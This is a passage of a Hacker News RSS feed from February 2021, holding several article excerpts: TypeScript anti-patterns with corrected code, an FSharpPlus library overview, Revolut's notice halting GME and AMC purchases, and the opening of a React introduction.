<p>Looking at the team level also enables managers to catch blockers as they evolve. Small issues, for instance, may not be apparent when the company is young, but can evolve into 10,000 papercuts only apparent at the team level. If code reviews take days instead of hours, at first one engineer complains, then two, then three... and if you don't pay attention, years later the engineering culture is shot. By compiling these small quantifications and observing their trends, a manager can understand whether a report is one individual's experience or truly relevant to the overall performance of the team.</p>
<p>Perhaps most important, if blockers follow a constant evolution (e.g. one person is often the canary in the coalmine), an engineering leader can map how the new blockers are likely to evolve and prioritize which should be solved first.</p>
<p>Just as an airplane pilot must monitor dozens of different metrics to keep the plane flying, so too would an engineering leader benefit from viewing their team's metrics to understand overall performance.</p>
<blockquote>
<p>In an optimal engineering dashboard, a leader would be able to assess the blockers that prevent the ultimate success of their team.Â&nbsp;</p>
</blockquote>
<h2 id="toward-engineering-effectiveness">Toward Engineering EffectivenessÂ&nbsp;</h2>
<p>"Productivity" is an appropriate measure for someone making widgets at a factory: "How many products did you produce in an hour?"</p>
<p>Engineering should instead be about effectiveness: "How able is this engineer to effect positive impact?"</p>
<p>Looking forward, engineering effectiveness will have three parts:</p>
<ol>
<li>Measuring the experience of engineering teams in their most frequent activities. (Think<a href="https://www.scalyr.com/blog/distributed-tracing-important-2019/" rel="nofollow noopener noreferrer" target="_blank"> distributed tracing</a>, but for human activities.)</li>
<li>Using the …</li></ol></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.okayhq.com/blog/engineering-productivity-can-be-measured">https://www.okayhq.com/blog/engineering-productivity-can-be-measured</a></em></p>]]>
            </description>
            <link>https://www.okayhq.com/blog/engineering-productivity-can-be-measured</link>
            <guid isPermaLink="false">hacker-news-small-sites-26005758</guid>
            <pubDate>Tue, 02 Feb 2021 19:57:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bad TypeScript Habits]]>
            </title>
            <description>
<![CDATA[
Score 221 | Comments 215 (<a href="https://news.ycombinator.com/item?id=26005330">thread link</a>) | @jgwil2
<br/>
February 2, 2021 | https://startup-cto.net/10-bad-typescript-habits-to-break-this-year/ | <a href="https://web.archive.org/web/*/https://startup-cto.net/10-bad-typescript-habits-to-break-this-year/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            <!--kg-card-begin: markdown--><p>TypeScript and JavaScript have steadily evolved over the last years, and some of the habits we built over the last decades have become obsolete. Some might never have been meaningful. Here's a list of 10 habits that we all should break.</p>
<p>If you are interested in more articles and news about web product development and entrepreneurship, please feel free to <a href="https://twitter.com/intent/follow?original_referer=https%253A%252F%252Fstartup-cto.net%252F&amp;ref_src=twsrc%5Etfw&amp;region=follow_link&amp;screen_name=The_Startup_CTO&amp;tw_p=followbutton">follow me on Twitter</a>.</p>
<p>Onto the examples! Please note that each "What it should look like" only fixes the issue discussed, even if there are further code smells that should be addressed.</p>
<h2 id="1notusingstrictmode">1. Not using <code>strict</code> mode</h2>
<h3 id="whatitlookslike">What it looks like</h3>
<p>Using a <code>tsconfig.json</code> without strict mode.</p>
<pre><code>{
  "compilerOptions": {
    "target": "ES2015",
    "module": "commonjs"
  }
}
</code></pre>
<h3 id="whatitshouldlooklike">What it should look like</h3>
<p>Just enable <code>strict</code> mode:</p>
<pre><code>{
  "compilerOptions": {
    "target": "ES2015",
    "module": "commonjs",
    "strict": true
  }
}
</code></pre>
<h3 id="whywedoit">Why we do it</h3>
<p>Introducing stricter rules in an existing codebase takes time.</p>
<h3 id="whyweshouldnt">Why we shouldn't</h3>
<p>Stricter rules will make it easier to change code in the future, so the time spent on fixing the code is returned and then some when working on the repository in the future.</p>
<h2 id="2definingdefaultvalueswith">2. Defining default values with <code>||</code></h2>
<h3 id="whatitlookslike">What it looks like</h3>
<p>Falling back with <code>||</code> for optional values:</p>
<pre><code>function createBlogPost (text: string, author: string, date?: Date) {
  return {
    text: text,
    author: author,
    date: date || new Date()
  }
}
</code></pre>
<h3 id="whatitshouldlooklike">What it should look like</h3>
<p>Use the new <code>??</code> operator, or, even better, define the fallback right at the parameter level.</p>
<pre><code>function createBlogPost (text: string, author: string, date: Date = new Date())
  return {
    text: text,
    author: author,
    date: date
  }
}
</code></pre>
<h3 id="whywedoit">Why we do it</h3>
<p>The <code>??</code> operator has just been introduced last year, and when using values in the middle of a long function it might be hard to set them already as parameter defaults.</p>
<h3 id="whyweshouldnt">Why we shouldn't</h3>
<p><code>??</code>, unlike <code>||</code>, falls back only for <code>null</code> or <code>undefined</code>, not for all falsy values. Also, if your functions are so long that you cannot define defaults at the beginning, then splitting them might be a good idea.</p>
<h2 id="3usinganyastype">3. Using <code>any</code> as type</h2>
<h3 id="whatitlookslike">What it looks like</h3>
<p>Using <code>any</code> for data when you are unsure about the structure.</p>
<pre><code>async function loadProducts(): Promise&lt;Product[]&gt; {
  const response = await fetch('https://api.mysite.com/products')
  const products: any = await response.json()
  return products
}
</code></pre>
<h3 id="whatitshouldlooklike">What it should look like</h3>
<p>In almost every situation where you type something as <code>any</code>, you should type it as <code>unknown</code> instead.</p>
<pre><code>async function loadProducts(): Promise&lt;Product[]&gt; {
  const response = await fetch('https://api.mysite.com/products')
  const products: unknown = await response.json()
  return products as Product[]
}
</code></pre>
<h3 id="whywedoit">Why we do it</h3>
<p><code>any</code> is convenient, as it basically disables all type-checks. Often, <code>any</code> is used even in official typings (e. g. <code>response.json()</code> from the example above is typed as <code>Promise&lt;any&gt;</code> by the TypeScript team).</p>
<h3 id="whyweshouldnt">Why we shouldn't</h3>
<p>It basically disables all type-checks. Anything that comes in via <code>any</code> will completely forego any type-checks. This leads to hard to catch bugs, as code will fail only when our assumptions about type structure are relevant to the runtime code.</p>
<h2 id="4valassometype">4. <code>val as SomeType</code></h2>
<h3 id="whatitlookslike">What it looks like</h3>
<p>Forcefully telling the compiler about a type that it cannot infer.</p>
<pre><code>async function loadProducts(): Promise&lt;Product[]&gt; {
  const response = await fetch('https://api.mysite.com/products')
  const products: unknown = await response.json()
  return products as Product[]
}
</code></pre>
<h3 id="whatitshouldlooklike">What it should look like</h3>
<p>That's what type guards are for.</p>
<pre><code>function isArrayOfProducts (obj: unknown): obj is Product[] {
  return Array.isArray(obj) &amp;&amp; obj.every(isProduct)
}

function isProduct (obj: unknown): obj is Product {
  return obj != null
    &amp;&amp; typeof (obj as Product).id === 'string'
}

async function loadProducts(): Promise&lt;Product[]&gt; {
  const response = await fetch('https://api.mysite.com/products')
  const products: unknown = await response.json()
  if (!isArrayOfProducts(products)) {
    throw new TypeError('Received malformed products API response')
  }
  return products
}
</code></pre>
<h3 id="whywedoit">Why we do it</h3>
<p>When converting from JavaScript to TypeScript, the existing codebase often makes assumptions about types that cannot be deduced automatically by the TypeScript compiler. In these cases, throwing in a quick <code>as SomeOtherType</code> can speed up the conversion without having to loosen the settings in tsconfig.</p>
<h3 id="whyweshouldnt">Why we shouldn't</h3>
<p>Even if the assertion might be save right now, this might change when someone moves code around. The type guard will ensure that all checks are explicit.</p>
<h2 id="5asanyintests">5. <code>as any</code> in tests</h2>
<h3 id="whatitlookslike">What it looks like</h3>
<p>Creating incomplete stand-ins when writing tests.</p>
<pre><code>interface User {
  id: string
  firstName: string
  lastName: string
  email: string
}

test('createEmailText returns text that greats the user by first name', () =&gt; {
  const user: User = {
    firstName: 'John'
  } as any
  
  expect(createEmailText(user)).toContain(user.firstName)
}
</code></pre>
<h3 id="whatitshouldlooklike">What it should look like</h3>
<p>If you need to mock data for your tests, move the mocking logic next to the thing you mock and make it reusable.</p>
<pre><code>interface User {
  id: string
  firstName: string
  lastName: string
  email: string
}

class MockUser implements User {
  id = 'id'
  firstName = 'John'
  lastName = 'Doe'
  email = 'john@doe.com'
}

test('createEmailText returns text that greats the user by first name', () =&gt; {
  const user = new MockUser()

  expect(createEmailText(user)).toContain(user.firstName)
}
</code></pre>
<h3 id="whywedoit">Why we do it</h3>
<p>When writing tests in a codebase that doesn't have great test coverage yet, there are often complicated big data structures, but only parts of it are needed for the specific functionality under test. Not having to worry about the other properties is easier in the short term.</p>
<h3 id="whyweshouldnt">Why we shouldn't</h3>
<p>Foregoing the creation of a mock will bite us, latest when one of the properties changes and we need to change it in all tests instead of one central location. Also, there will be situations where the code under test relies on properties that we did not deem important before, and then all tests for that functionality need to be updated.</p>
<h2 id="6optionalproperties">6. Optional properties</h2>
<h3 id="whatitlookslike">What it looks like</h3>
<p>Marking properties as optional that are sometimes there and sometimes not.</p>
<pre><code>interface Product {
  id: string
  type: 'digital' | 'physical'
  weightInKg?: number
  sizeInMb?: number
}
</code></pre>
<h3 id="whatitshouldlooklike">What it should look like</h3>
<p>Explicitly model which combinations exist and which don't.</p>
<pre><code>interface Product {
  id: string
  type: 'digital' | 'physical'
}

interface DigitalProduct extends Product {
  type: 'digital'
  sizeInMb: number
}

interface PhysicalProduct extends Product {
  type: 'physical'
  weightInKg: number
}
</code></pre>
<h3 id="whywedoit">Why we do it</h3>
<p>Marking properties as optional instead of splitting out types is easier and produces less code. It also requires a deeper understanding of the product being build and might limit usage of code if assumptions about the product change.</p>
<h3 id="whyweshouldnt">Why we shouldn't</h3>
<p>The big benefit of type systems is that they can replace runtime checks with compile-time checks. With more explicit typing, it is possible to get compile-time checks for bugs that otherwise might have gotten unnoticed, e. g. by making sure that every <code>DigitalProduct</code> has a <code>sizeInMb</code>.</p>
<h2 id="7onelettergenerics">7. One letter generics</h2>
<h3 id="whatitlookslike">What it looks like</h3>
<p>Naming a generic with one letter</p>
<pre><code>function head&lt;T&gt; (arr: T[]): T | undefined {
  return arr[0]
}
</code></pre>
<h3 id="whatitshouldlooklike">What it should look like</h3>
<p>Giving a full descriptive type name.</p>
<pre><code>function head&lt;Element&gt; (arr: Element[]): Element | undefined {
  return arr[0]
}
</code></pre>
<h3 id="whywedoit">Why we do it</h3>
<p>This habit grew I guess because <a href="https://www.typescriptlang.org/docs/handbook/generics.html">even the official docs use one-letter names</a>. It is also quicker to type and requires less thinking to press <code>T</code> instead of writing a full name.</p>
<h3 id="whyweshouldnt">Why we shouldn't</h3>
<p>Generic type variables are variables, like any other. We have abandoned the idea of describing the technicalities of variables in their names when IDEs started to just show us these technicalities. E. g. instead of <code>const strName = 'Daniel'</code> we now only write <code>const name = 'Daniel'</code>. Also, one letter variable names are generally frowned upon because it can be hard to decipher what they mean without looking at their declaration.</p>
<h2 id="8nonbooleanbooleanchecks">8. Non-boolean boolean checks</h2>
<h3 id="whatitlookslike">What it looks like</h3>
<p>Checking whether a value is defined by passing the value directly to an <code>if</code> statement.</p>
<pre><code>function createNewMessagesResponse (countOfNewMessages?: number) {
  if (countOfNewMessages) {
    return `You have ${countOfNewMessages} new messages`
  }
  return 'Error: Could not retrieve number of new messages'
}
</code></pre>
<h3 id="whatitshouldlooklike">What it should look like</h3>
<p>Explicitly checking for the condition we care about.</p>
<pre><code>function createNewMessagesResponse (countOfNewMessages?: number) {
  if (countOfNewMessages !== undefined) {
    return `You have ${countOfNewMessages} new messages`
  }
  return 'Error: Could not retrieve number of new messages'
}
</code></pre>
<h3 id="whywedoit">Why we do it</h3>
<p>Writing the check in short looks more succinct and allows us to avoid thinking about what we actually want to check.</p>
<h3 id="whyweshouldnt">Why we shouldn't</h3>
<p>Maybe we should think about what we actually want to check. The examples above for example handle the case of <code>countOfNewMessages</code> being <code>0</code> differently.</p>
<h2 id="9thebangbangoperator">9. The Bang Bang operator</h2>
<h3 id="whatitlookslike">What it looks like</h3>
<p>Converting a non-boolean value to boolean.</p>
<pre><code>function createNewMessagesResponse (countOfNewMessages?: number) {
  if (!!countOfNewMessages) {
    return `You have ${countOfNewMessages} new messages`
  }
  return 'Error: Could not retrieve number of new messages'
}
</code></pre>
<h3 id="whatitshouldlooklike">What it should look like</h3>
<p>Explicitly checking for the condition we care about.</p>
<pre><code>function createNewMessagesResponse (countOfNewMessages?: number) {
  if (countOfNewMessages !== undefined) {
    return `You have ${countOfNewMessages} new messages`
  }
  return 'Error: Could not retrieve number of new messages'
}
</code></pre>
<h3 id="whywedoit">Why we do it</h3>
<p>To some, understanding <code>!!</code> is like an initiation ritual to the world of JavaScript. It looks short and succinct, and if you are already used to it, then you know what it is about. It is a shortcut to convert any value to a boolean. Especially if, in a codebase, there is no clear semantic separation between falsy values like <code>nu…</code></p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://startup-cto.net/10-bad-typescript-habits-to-break-this-year/">https://startup-cto.net/10-bad-typescript-habits-to-break-this-year/</a></em></p>]]>
            </description>
            <link>https://startup-cto.net/10-bad-typescript-habits-to-break-this-year/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26005330</guid>
            <pubDate>Tue, 02 Feb 2021 19:22:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[This is the Future. and It Sucks]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 14 (<a href="https://news.ycombinator.com/item?id=26005270">thread link</a>) | @MaurizioPz
<br/>
February 2, 2021 | https://open.lbry.com/@Lunduke:e/TheFutureSucks:b?r=333G8YicUkjwx3FXtVfrCosJ3K4HCNW6 | <a href="https://web.archive.org/web/*/https://open.lbry.com/@Lunduke:e/TheFutureSucks:b?r=333G8YicUkjwx3FXtVfrCosJ3K4HCNW6">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://open.lbry.com/@Lunduke:e/TheFutureSucks:b?r=333G8YicUkjwx3FXtVfrCosJ3K4HCNW6</link>
            <guid isPermaLink="false">hacker-news-small-sites-26005270</guid>
            <pubDate>Tue, 02 Feb 2021 19:17:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is Cardano?]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 6 (<a href="https://news.ycombinator.com/item?id=26005048">thread link</a>) | @richardfsr
<br/>
February 2, 2021 | https://readir.net/blog/#what-is-cardano | <a href="https://web.archive.org/web/*/https://readir.net/blog/#what-is-cardano">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://readir.net/blog/#what-is-cardano</link>
            <guid isPermaLink="false">hacker-news-small-sites-26005048</guid>
            <pubDate>Tue, 02 Feb 2021 18:59:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A cool coding library I somehow overlooked – FSharpPlus]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26003793">thread link</a>) | @todsacerdoti
<br/>
February 2, 2021 | https://danielbmarkham.com/how-didnt-i-know-about-this-fsharpplus/ | <a href="https://web.archive.org/web/*/https://danielbmarkham.com/how-didnt-i-know-about-this-fsharpplus/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div id="post-body">
        <p>The other day somebody on reddit asked the age-old question: <a href="https://old.reddit.com/r/fsharp/comments/la1mz5/a_simple_question/">why didn't F# have typeclasses or functors?</a></p><p>That's a long discussion, but while reading replies, somebody mentioned this cool litte <a href="https://github.com/fsprojects/FSharpPlus">F#+ library.</a></p><p>Over to GitHub we go!</p><p>Over the years, as I've written more and more solutions in F#, I've come across stuff I wanted to do where it seemed as if I were fighting the language too much. Stuff like common conversions with strings. Turns out a lot of other people have those issues also, so folks started collecting little goodies here and there. You're coding along, and suddenly you realize you want to make sure that string is all lower case. Wouldn't it be nice if there were a method to automatically do that, something like "foo".toLower()?</p><p>As most every coder knows, that's already don. It's in there. But it's not just that one little method. During regular coding you run across all kinds of stuff that hasn't been coded. Let's say you want to put hyphens in a string (why, I don't know)</p><!--kg-card-begin: markdown--><pre><code>    // Extensions
    let allCapsString = "I LIKE HYPHENS!"
    printfn "Extensions to core types"
    printfn "Original"
    printfn "%s" allCapsString
    let stickSomeHyphensInThere =  String.intersperse '-'
    printfn "Fixed"
    printfn "%s" (stickSomeHyphensInThere allCapsString)
    ```</code></pre>
<!--kg-card-end: markdown--><p>That's trivial stuff, but damn stuff like that gets old. And it's not just trivial stuff. Let's you've got a list and you're expecting only one element in it. Lots of business logic revolves around making sure you have one and only one thing. How about this?</p><!--kg-card-begin: markdown--><pre><code>    let singletonTestData1=[1]
    let singletonTestData2=[]
    // reuturns the value or throws an error
    let singletonRet1=List.exactlyOne singletonTestData1
    // returns the value or none
    let singletonRet2:Option&lt;int&gt;=
        Option.protect List.exactlyOne singletonTestData2
</code></pre>
<!--kg-card-end: markdown--><p>That's pretty nifty because you can make sure it's only one item (or throw an error), catch the error and deal with it later (not shown here), or bail out on any decision-making entirely and let somebody else worry about it, ie, use an option.</p><p>I imagine we could do the same with atLeastOne. In fact, I might code that up as a PR. That's also a very common business requirement.</p><p>And you can extend generics too. How many times have you written a function and wanted to use it later as an operator? That kinda thing is fairly common in C++, and you can certainly do it in NET, but many times to get it done it seems unnecessarily complicated. How about this?</p><!--kg-card-begin: markdown--><pre><code>
    // turn any function into an operator
    let smallerThan a b=a &lt; b
    // isSmaller = true
    let isSmaller = 10 &lt;/smallerThan/&gt; 20
    ```</code></pre>
<!--kg-card-end: markdown--><p>I'm not crazy about that syntax, but fooling around with it some, I can see where the FSharpPlus guys were coming from. There are some odd language issues at stake, and this looks like a good compromise. I think this works better than some of the other options.</p><p>Once again, none of this is rocket science. All along you could have made this happen in whatever .NET language you use. It's nice having it already in there. Thanks guys!</p><p>I saw this one and almost had a nerdgasm. Every now and then you'll have a string and want to convert it to bytes, perhaps for some low-level fun with bits. Ever try to do that from scratch? Wow, it's a pain. There are excellent reasons it's a pain: there's encoding, there's collation rules, the list goes on and on. Human languages are tough. But what about just a dang default? Try this.</p><!--kg-card-begin: markdown--><pre><code>    // Generic operators
    // Whatever I've got, make it bytes
    let myBufferBytes =
        "This is something I need to do bit-level stuff with" |&gt; toBytes
        ```</code></pre>
<!--kg-card-end: markdown--><p>Because that's a type extension on a generic, that works with all types of stuff. Just throw whatever you've got to toBytes and move on.</p><p>You can do this on your own, but you'll kill precious development time (and focus) wading through docs. And if you only do it one or two times a year it'll be that same pain, over and over again.</p><!--kg-card-begin: markdown--><pre><code>    // Need to splay out a bunch of processing and then sum when done?
    let res42 = map ((+) 21) (async {return 21})
    let myComputationallyHardAnswer = extract res42
</code></pre>
<!--kg-card-end: markdown--><p>Here we've wrapped up some common threading stuff along with collection traversal.</p><p>Of course, it's all composable with all of the other tools you have.</p><p>In another post I'll do some of the other cool stuff, like all of the mondad things they have, &nbsp;but that really gets into the technical part of coding itself instead of the convenience provided here. For now, <a href="https://github.com/fsprojects/FSharpPlus">you should check it out</a>.</p><figure><img src="https://danielbmarkham.com/content/images/2021/02/2018-12-Daniel-Signature.png" alt="" srcset="https://danielbmarkham.com/content/images/size/w600/2021/02/2018-12-Daniel-Signature.png 600w, https://danielbmarkham.com/content/images/size/w1000/2021/02/2018-12-Daniel-Signature.png 1000w, https://danielbmarkham.com/content/images/size/w1600/2021/02/2018-12-Daniel-Signature.png 1600w, https://danielbmarkham.com/content/images/size/w2400/2021/02/2018-12-Daniel-Signature.png 2400w" sizes="(min-width: 720px) 720px"></figure>    </div>
</div></div>]]>
            </description>
            <link>https://danielbmarkham.com/how-didnt-i-know-about-this-fsharpplus/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26003793</guid>
            <pubDate>Tue, 02 Feb 2021 17:27:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Revolut has stopped trading GME and AMC]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 34 (<a href="https://news.ycombinator.com/item?id=26003731">thread link</a>) | @powerandr
<br/>
February 2, 2021 | https://www.mrhack.io/blog/revolut-stops-trading-gme-amc-stocks-statement/ | <a href="https://web.archive.org/web/*/https://www.mrhack.io/blog/revolut-stops-trading-gme-amc-stocks-statement/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page-content" itemprop="mainContentOfPage">
	<section><div><div><div><div><div><div><p><i></i>3,923<span> views</span></p><p><time datetime="2021-02-02T17:20:03+00:00" title="2 February 2021 at 17:20:03 +00:00" itemprop="datePublished">2 Feb at 5:20 pm</time></p></div><div><div><p><iframe title="Breaking - Revolut STOPS TRADING $GME &amp; $AMC stocks" width="640" height="360" src="https://www.youtube.com/embed/1d2bB1PfSTI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></div></div><div itemprop="text"><p>Here is a full statement from Revolut.</p>
<p>Revolut customers in Europe received this email around 4.54PM CET.</p>
<h2>Trading Update for GME &amp; AMC</h2>
<div>
<div>
<div>
<div>
<div>
<div>
<p>Hi …,</p>
<p>From today, we will only be able to facilitate the selling of GameStop (NYSE: <strong>GME</strong>) and AMC Entertainment (NYSE: <strong>AMC</strong>) stocks for the time being. Unfortunately, our broker-dealer in the US, DriveWealth, can no longer offer Buys on these stocks due to increased capital requirements set by the Depository Trust Company (DTC) in the US.</p>
<h3>What does this mean for me?</h3>
<p>You can only sell out your existing holdings in these stocks. Any outstanding buy orders on these two symbols made after Monday’s (1 February) close will automatically be cancelled prior to market open on February 2 2021.</p>
<p>None of our other stocks are affected at this time and are available to trade as normal.</p>
<p>For customers with no holdings in these 2 stocks, neither GME, nor AMC will appear when searched. This is a standard practice when a position moves to sell only, as we don’t want to show you stocks you’re not able to buy at that time. As soon as they become available to buy again, you’ll be able to see them in the app.</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<div>
<h3>Why is this happening?</h3>
<p>When a stock is traded, it takes two days for the proceeds to go from the broker to the clearing house. This is known as T+2 settlement. Within this time, the clearing house requires the broker to front cash or capital guarantees to ensure funds are available through the settlement process.</p>
<p>The required amount of capital is usually around 10-15% of the value of a security’s holdings on broker’s books. However, this percentage can vary based on stock volatility. In the case of GME and AMC, the DTC has enforced an increase of capital requirements by 250% upon DriveWealth’s clearing partners.</p>
<p>This increase means that DriveWealth is now obligated to restrict trading in GME and AMC, as each stock has its own capital requirement rather than a broker wide requirement.</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<div>
<h3>When will they be available again to buy?</h3>
<p>This is not a decision Revolut has made, simply one that we are obligated to carry out. We are monitoring the situation very closely and will update you when our partner, DriveWealth, re-enables Buys for GME and AMC. We apologise for any inconvenience caused.</p>
<p>Team Revolut</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<div>
<p><strong>Capital at Risk</strong></p>
<p>The value of a stock may fall as well as rise and you may get back less than what you initially paid, and in some cases the stock may lose its entire value and you may lose your initial investment. This is not investment advice. It is strongly recommended that you seek professional investment advice before making any investment decision.</p>
<p><strong>Disclaimer:</strong> Revolut Trading Ltd. is an appointed representative of Resolution Compliance Ltd which is authorised and regulated by the Financial Conduct Authority (FRN:574048).</p>
</div>
</div>
</div>
</div>
</div>
</div>
<p>Revolut is one of the most popular investing apps in Europe. Maybe it is not that well-known in US yet.</p>
<p>But, until recently, it was one of possible alternatives to Robinhood to buy $GME and $AMC stocks.<br>
<iframe title="How to buy $GME &amp; $AMC stock in Revolut app?" width="640" height="360" src="https://www.youtube.com/embed/82uUmO9L80o?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>
What are alternatives to Revolut in Europe – to buy $GME and $AMC stocks?</p>
<p>According to <a href="https://invezz.com/news/2021/02/02/revolut-competitors/" target="_blank" rel="noopener">Invezz</a>, you can still buy these stocks in:</p>
<ul>
<li>Saxo</li>
<li>BlackBull markets</li>
<li>AvaTrade</li>
</ul>


<blockquote>
<p lang="en" dir="ltr">Revolut in the UK. WOW. <a href="https://twitter.com/wsbmod?ref_src=twsrc%5Etfw">@wsbmod</a> <a href="https://t.co/ypLOGVsMLl">pic.twitter.com/ypLOGVsMLl</a></p>
<p>— Nakamoto Plaza (@NakamotoPlaza) <a href="https://twitter.com/NakamotoPlaza/status/1356626544173711360?ref_src=twsrc%5Etfw">February 2, 2021</a></p></blockquote>

<blockquote>
<p lang="en" dir="ltr">The GameStop stock is tanking. Who knows where it goes from here, but if you're someone who's been trying to hang on, curious to hear what the ride has been like for you. My DMs are open, email is patrick.klepek@vice.com</p>
<p>— Patrick Klepek (@patrickklepek) <a href="https://twitter.com/patrickklepek/status/1356636750471389190?ref_src=twsrc%5Etfw">February 2, 2021</a></p></blockquote>

<blockquote>
<p lang="en" dir="ltr"><a href="https://twitter.com/freetrade?ref_src=twsrc%5Etfw">@freetrade</a> deciding to mysteriously limit stock purchases for <a href="https://twitter.com/hashtag/GME?src=hash&amp;ref_src=twsrc%5Etfw">#GME</a> and <a href="https://twitter.com/hashtag/AMC?src=hash&amp;ref_src=twsrc%5Etfw">#AMC</a> but still letting you put in sell orders before market open today.</p>
<p>Going the way of <a href="https://twitter.com/RobinhoodApp?ref_src=twsrc%5Etfw">@RobinhoodApp</a> are we? 🤔🤔🤔</p>
<p>— Vall Syrene – Legendary Hunts Out Now! #BLM (@Valldoesdnd) <a href="https://twitter.com/Valldoesdnd/status/1356249868675780612?ref_src=twsrc%5Etfw">February 1, 2021</a></p></blockquote>

<blockquote>
<p lang="en" dir="ltr">Now <a href="https://twitter.com/hashtag/revolut?src=hash&amp;ref_src=twsrc%5Etfw">#revolut</a> is also not allowing GME or AMC… :/ <a href="https://twitter.com/search?q=%24gme&amp;src=ctag&amp;ref_src=twsrc%5Etfw">$gme</a> <a href="https://twitter.com/search?q=%24amc&amp;src=ctag&amp;ref_src=twsrc%5Etfw">$amc</a> <a href="https://t.co/X68sL8y24X">pic.twitter.com/X68sL8y24X</a></p>
<p>— Michael (@MykeJD1) <a href="https://twitter.com/MykeJD1/status/1356609588569726977?ref_src=twsrc%5Etfw">February 2, 2021</a></p></blockquote>


</div></div></div></div></div></div></section>
</div></div>]]>
            </description>
            <link>https://www.mrhack.io/blog/revolut-stops-trading-gme-amc-stocks-statement/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26003731</guid>
            <pubDate>Tue, 02 Feb 2021 17:22:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is React: A Visual Introduction for Beginners]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26003666">thread link</a>) | @swyx
<br/>
February 2, 2021 | https://learnreact.design/posts/what-is-react | <a href="https://web.archive.org/web/*/https://learnreact.design/posts/what-is-react">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2><a id="introduction" href="#introduction"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" height="20" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Introduction</a></h2><blockquote><p>React is a JavaScript library for building user interfaces.</p></blockquote><p>This is the official definition of React. But what if you are not familiar with JavaScript? What if you are not a developer? Would you still be able to make sense of (and learn) React?</p><p>My answer is a firm YES. That's why I wrote this article: what is React exactly? Why is it so popular? What problems does React solve?</p><p>This article is an introduction to React for beginners. It's the first post you'd want to read before learning the specifics of React. I'll explain the core ideas of React in plain English (and doodles <span>🌴</span>). No JavaScript experience? No problem! As long as you have some basic HTML knowledge (e.g. the format of an HTML tag), you should be able to enjoy this article.</p><p>This is a bird's-eye view <span>🦅</span> but I'll also equip you with a pair of binoculars <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 -48 512 512"><g fill="#40404c"><path d="M211.023 137.027h89.95v145.938h-89.95zm0 0M298.3 72.402V52.211c0-24.637 19.973-44.61 44.614-44.61a44.665 44.665 0 0124.809 7.528 44.657 44.657 0 0116.425 20.066l7.207 17.473"></path><path d="M279.29 123.621v171.84l128.757-23.563 89.082-16.308L430.344 93.69a78.505 78.505 0 00-28.906-35.308 78.457 78.457 0 00-47.641-13.153c-41.5 2.067-74.508 36.383-74.508 78.391zm0 0"></path></g><path fill="#5b5b68" d="M353.797 45.23l54.25 226.668 89.082-16.308L430.344 93.69a78.505 78.505 0 00-28.906-35.308 78.457 78.457 0 00-47.641-13.153zm0 0"></path><path fill="#e4e4ef" d="M504.398 295.457c0 62.164-50.394 112.559-112.558 112.559-62.164 0-112.555-50.395-112.555-112.559 0-62.164 50.39-112.559 112.555-112.559 62.164 0 112.558 50.395 112.558 112.559zm0 0"></path><path fill="#40404c" d="M471.434 295.457c0 43.957-35.637 79.59-79.594 79.59-43.953 0-79.59-35.633-79.59-79.59s35.637-79.59 79.59-79.59c43.957 0 79.594 35.633 79.594 79.59zm0 0"></path><path fill="#589ce0" d="M314.191 277.918c7.985 35.52 39.715 62.062 77.641 62.062 37.922 0 69.664-26.542 77.648-62.062-7.984-35.52-39.714-62.055-77.64-62.055-37.934 0-69.664 26.535-77.649 62.055zm0 0"></path><path fill="#40404c" d="M120.645 52.668l7.203-17.473a44.69 44.69 0 0116.43-20.066 44.665 44.665 0 0124.808-7.527c24.637 0 44.613 19.972 44.613 44.609v20.191"></path><path fill="#5b5b68" d="M232.71 123.621v171.84l-128.757-23.563-89.082-16.308L81.656 93.69a78.522 78.522 0 0128.903-35.308 78.479 78.479 0 0147.644-13.153c41.5 2.067 74.508 36.383 74.508 78.391zm0 0"></path><path fill="#40404c" d="M158.203 45.23l-54.25 226.668-89.082-16.308L81.656 93.69a78.522 78.522 0 0128.903-35.308 78.479 78.479 0 0147.644-13.153zm0 0"></path><path fill="#e4e4ef" d="M232.715 295.457c0 62.164-50.39 112.559-112.555 112.559-62.164 